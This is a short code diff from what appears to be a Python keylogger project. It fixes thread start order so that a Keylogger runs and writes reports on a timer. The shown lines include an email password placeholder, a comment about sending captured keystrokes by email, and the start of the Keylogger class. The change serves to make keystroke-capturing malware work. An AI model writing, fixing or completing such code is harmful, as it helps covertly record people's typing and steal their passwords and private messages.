@@ -17,9 +17,6 @@ EMAIL_PASSWORD = "password_here"
 
 def run(**args):
     
-    Thread(target = func1).start()
-    Thread(target = func2).start()
-    
     def func1():
         keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     # if you want a keylogger to send to your email
@@ -29,6 +26,9 @@ def run(**args):
         keylogger.start()
     def func2():
         print("Working")
+    
+    Thread(target = func1).start()
+    Thread(target = func2).start()
 
 class Keylogger:
     def __init__(self, interval, report_method="file"):
